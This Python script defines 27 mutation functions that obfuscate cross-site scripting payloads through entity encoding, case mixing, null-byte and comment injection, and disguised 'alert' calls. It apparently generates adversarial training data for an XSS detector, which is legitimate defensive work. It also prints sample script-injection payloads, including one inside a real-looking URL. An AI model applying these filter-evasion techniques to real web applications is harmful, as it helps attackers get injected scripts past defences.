import random
import re
import pandas as pd
import base64
import html
import importlib
import importlib.util

javascript_injects = r'[&NewLine;|&#x09|&colon;|&Tab;]*'
javascript_injected = rf'j{javascript_injects}a{javascript_injects}v{javascript_injects}a{javascript_injects}s{javascript_injects}c{javascript_injects}r{javascript_injects}i{javascript_injects}p{javascript_injects}t'
opening_bracket = r'<(?:&#(?:60|0*3[46]);)?'
# html_tag = rf'{opening_bracket}([a-z]+)(?![^>]*\/>)[^>]*>|{opening_bracket}\w+>|{opening_bracket}\/\w+>'
html_tag = r'<.+?>|%3c.+?%3e|&lt;.+?&gt;||%3c.+?&gt;||&lt;.+?%3e'
js_tag = rf'{opening_bracket}script(?:&#(?:60|0*3[46]);)?'

benign_set = pd.read_csv('../../data/train.csv')
benign_set = benign_set[benign_set['Class'] == "Benign"]


def find_safe_positions(char):
    # Define characters for < and >
    lt_chars = ['<']
    gt_chars = ['>']

    # Define HTML entity equivalents for < and >
    lt_entities = ['%3c', '&lt;']
    gt_entities = ['%3e', '&gt;']

    # Find safe positions where to inject %00
    safe_positions = []
    for pos, c in enumerate(char):
        # After spaces
        if c == ' ':
            safe_positions.append(pos + 1)
        # After < or its HTML entity equivalents
        elif c in lt_chars or char[pos:pos + 3] == "%3c":
            safe_positions.append(pos + 3)
        elif char[pos:pos + 4] == "&lt;":
            safe_positions.append(pos+4)
        # Before > or its HTML entity equivalents
        elif c in gt_chars or char[pos:pos + 4] in gt_entities:
            safe_positions.append(pos)
    return safe_positions


def match_javascript(payload):
    is_js_tag = re.search(js_tag, payload)
    if is_js_tag:
        return True
    return re.search(javascript_injected, payload)


def inject_javascript(payload, injection):
    # inject outside what between & and ;
    parts = re.split(r'&(?<=&)[\D\d]*(?=;);|(?=9)9', payload)
    parts = [part for part in parts if part.strip()]
    # random position to inject
    pos = random.randint(0, len(parts) - 1)
    # inject at random position
    length = len(parts[pos])
    new_part = parts[pos][:length // 2] + injection + parts[pos][length // 2:]
    # print(parts[pos])
    # print(new_part)
    # print()
    return re.sub(parts[pos], new_part, payload)


def random_case(match):
    string = ''
    char = match.group(0)
    for c in char:
        new_c = random.choice([c.upper(), c.lower()])
        string += new_c
    return string


# Add " &#14" before "javascript"
def action_1(payload):
    return re.sub(r'java[\D\d]*script', ' &#14javascript', payload)


# Mixed case HTML attributes
def action_2(payload):
    def find_attribute(match):
        char = match.group(0)
        return re.sub(r'\w+(?==)', random_case, char)

    return re.sub(r'<([a-z]+)(?![^>]*\/>)[^>]*>', find_attribute, payload)


# Replace spaces with "/", "%0A", or "%0D"
def action_3(payload):
    return re.sub(r'\s', random.choice(['/ ', '%0A ', '%0D ']), payload)


# Mixed case HTML tags
def action_4(payload):
    return re.sub(html_tag, random_case, payload)


# Remove closing symbols of the single tags
def action_5(payload):
    tag_pattern = r'<([a-z]+)(?![^>]*\/>)[^>]*>'
    tag_match = re.search(tag_pattern, payload)
    if tag_match:
        tag = tag_match.group(0)
        content_match = re.search(r'(?<=<)\w+', tag)
        if content_match:
            content = content_match.group(0)
            closing_tag = re.search(r'</' + content + '>', payload)
            if closing_tag is None:
                modified_payload = tag[:-1] + " "  # Remove closing symbol and append a space
                return re.sub(tag_pattern, modified_payload, payload)
    return payload


# Add "&NewLine;" to "javascript"
def action_6(payload):
    def inject(match):
        char = match.group(0)
        return inject_javascript(char, '&NewLine;')

    return re.sub(javascript_injected, inject, payload)


# Add "&#x09" to "javascript"
def action_7(payload):
    def inject(match):
        char = match.group(0)
        return inject_javascript(char, '&#x09')

    return re.sub(javascript_injected, inject, payload)


# HTML entity encoding for JS code (hexadecimal)
def action_8(payload):
    javascript_protocol = match_javascript(payload)

    def encode_hex(match):
        char = match.group(0)[:-1]
        string = ''
        for c in char:
            string += '&#x' + hex(ord(c))[2:] + ';'
        return string + '('

    if javascript_protocol:
        return re.sub(r'(?x)[\w\.]+?\(', encode_hex, payload)
    return payload


# Double write html tags
def action_9(payload):
    def duplicate_tag(match):
        char = match.group(0)
        return char + char

    return re.sub(html_tag, duplicate_tag, payload, flags=re.IGNORECASE)


# Replace "http://" with "//"
def action_10(payload):
    return re.sub(r'http://|https://', '//', payload)


# HTML entity encoding for JS code (decimal)
def action_11(payload):
    javascript_protocol = match_javascript(payload)

    def encode_decimal(match):
        char = match.group(0)[:-1]
        string = ''
        for c in char:
            string += '&#' + str(ord(c)) + ';'
        return string + '('

    if javascript_protocol:
        return re.sub(r'(?x)[\w\.]+?\(', encode_decimal, payload)
    return payload


# Add "&colon;" to "javascript"
def action_12(payload):
    def inject(match):
        char = match.group(0)
        return inject_javascript(char, '&colon;')

    return re.sub(javascript_injected, inject, payload)


# Add "&Tab" to "javascript"
def action_13(payload):
    def inject(match):
        char = match.group(0)
        return inject_javascript(char, '&Tab;')

    return re.sub(javascript_injected, inject, payload)


#  Add string "/drfv/" after the script tag
def action_14(payload):
    return re.sub(r'<script>|%3cscript%3e|&ltscript&gt', '<script>/drfv/', payload, flags=re.IGNORECASE)


# Replace "(" and ")" with grave note
def action_15(payload):
    return re.sub(r'[()]', '`', payload)


# Encode data protocol with Base64
def action_16(payload):
    data_protocol = re.search(r'data:', payload)
    if data_protocol:
        byte_data = payload[data_protocol.end():].encode('utf-8')
        return payload[:data_protocol.end()] + base64.b64encode(byte_data).decode('utf-8')
    return payload


# Remove quotation marks
def action_17(payload):
    return re.sub(r'["\']', '', payload)


# Unicode encoding for JS code -> TO REMOVE ?
def action_18(payload):

    return payload
    pass


# HTML entity encoding for "javascript"
def action_19(payload):
    return re.sub(r'javascript', '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;', payload)


# Replace ">" of single label with "<"
# def action_20(payload):
#     # tag_pattern = r'<([a-z]+)(?![^>]*\/>)[^>]*>'
#     # tag_match = re.search(tag_pattern, payload)
#     # if tag_match:
#     #     tag = tag_match.group(0)
#     #     content_match = re.search(r'(?<=<)\w+', tag)
#     #     if content_match:
#     #         content = content_match.group(0)
#     #         closing_tag = re.search(r'</' + content + '>', payload)
#     #         if closing_tag is None:
#     #             modified_payload = tag[:-1] + "<"  # Remove closing symbol and append a space
#     #             return re.sub(tag_pattern, modified_payload, payload)
#
#     return payload
def action_20(payload):
    # # Define a regular expression pattern to match ">" not within HTML tags, even if they are encoded as &lt;, %3e, or &gt;
    # pattern = r'(?![^<]*)>|(?![^<]*)%3e|(?![^<]*)&gt;'
    # # print(re.search(pattern, payload))
    # # Use re.sub() to replace ">" with "<" if it's not part of an HTML tag
    # replaced_payload = re.sub(pattern, '<', payload, 1)
    replaced_payload = re.sub(r'&gt;&lt;', '&lt;', payload, flags=re.IGNORECASE)
    replaced_payload = re.sub(r'%3e%3c', '%3c', replaced_payload, flags=re.IGNORECASE)
    return replaced_payload


# Replace "alert" with "top['al'+'ert'](1)"
def action_21(payload):
    return re.sub(r'alert', "top['al'+'ert'](1)", payload)


# Replace "alert" with "top[8680439.toString(30)](1)"
def action_22(payload):
    return re.sub(r'alert', "top[8680439.toString(30)](1)", payload)


# Add interference string before the example
def action_23(payload):
    first_html_tag = re.search(html_tag, payload)
    # add random benign payload before the first tag
    if first_html_tag:
        benign_payload = benign_set.sample()["Payloads"].values[0]
        # get content after the last "/" of the benign payload
        last_slash = benign_payload.rfind("/")
        # get the content after the last "/" of the benign payload
        benign_payload = benign_payload[last_slash + 1:]
        # Add the benign payload before the first tag
        payload = payload[:first_html_tag.start()] + benign_payload + payload[first_html_tag.start():]
    return payload


# Add comment into tags
def action_24(payload):
    def add_comment(match):
        char = match.group(0)
        # find safe position where to inject, meaning not into a word
        safe_positions = find_safe_positions(char)
        # Choose a random safe position to inject
        if safe_positions:
            pos = random.choice(safe_positions)
            return char[:pos] + "<!--Comment-->" + char[pos:]
        return char

    return re.sub(html_tag, add_comment, payload, flags=re.IGNORECASE)


# "vbscript" replaces "javascript"
def action_25(payload):
    return re.sub(r'javascript', 'vbscript', payload)


#  Inject empty byte "%00" into tags
def action_26(payload):
    def inject_byte(match):
        char = match.group(0)

        # Find safe positions where to inject %00
        safe_positions = find_safe_positions(char)

        # Choose a random safe position to inject %00
        if safe_positions:
            pos = random.choice(safe_positions)
            return char[:pos] + "%00" + char[pos:]
        return char

    return re.sub(html_tag, inject_byte, payload, flags=re.IGNORECASE)


# Replace alert with "top[/al/.source+/ert/.source/](1)"
def action_27(payload):
    return re.sub(r'alert', "top[/al/.source+/ert/.source/](1)", payload)


def main():
    data_set = pd.read_csv('../../data/train.csv')
    example = data_set.head()["Payloads"][0]
    ex_2 = data_set["Payloads"][216]
    ex_3 = data_set["Payloads"][8344]
    ex_4 = data_set["Payloads"][6564]
    print(example)
    print(ex_2)
    print()
    for i in range(1, 28):
        action_name = "action_" + str(i)
        action = globals()[action_name]
        print(action_name)
        print(f"Action {i}", action(example))
        print(f"Action {i}", action(ex_2))
        print(f"Action {i}", action(ex_3))
        print(f"Action {i}", action('https://<script>alert("1")</script>'))
        print(f"Action {i}", action('https://<script src=ciao>alert("1")'))
        print(f"Action {i}", action('javascript'))
        print(f"Action {i}", action('java&#x09scr&NewLine;ipt'))
        print()

    # Generate array of random mutators of random length
    mutators = [globals()[f"action_{random.randint(2, 27)}"] for _ in range(random.randint(1, 5))]
    # Apply each mutation to the example
    # ex = ex_2
    # print(ex)
    # for mutator in mutators:
    #     ex = mutator(ex)
    #     print(ex)

    #  Apply action 26 more times
    ex = 'https://%3cscript src=ciao%3ealert("1")'
    ex = "http://seattle.mariners.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;"
    # ex = example
    for _ in range(10):
        ex = action_26(ex)
        print(ex)

    # data_set["Mutated Payload"] = None
    # # Generate random mutations and save the mutated examples
    # for i, row in data_set.iterrows():
    #     mutators = [globals()[f"action_{random.randint(2, 27)}"] for _ in range(random.randint(1, 5))]
    #     ex = row["Payloads"]
    #     for mutator in mutators:
    #         ex = mutator(ex)
    #     data_set.at[i, "Mutated Payload"] = ex
    # # data_set.to_csv('../../data/train_mutated.csv', index=False)


if __name__ == '__main__':
    main()
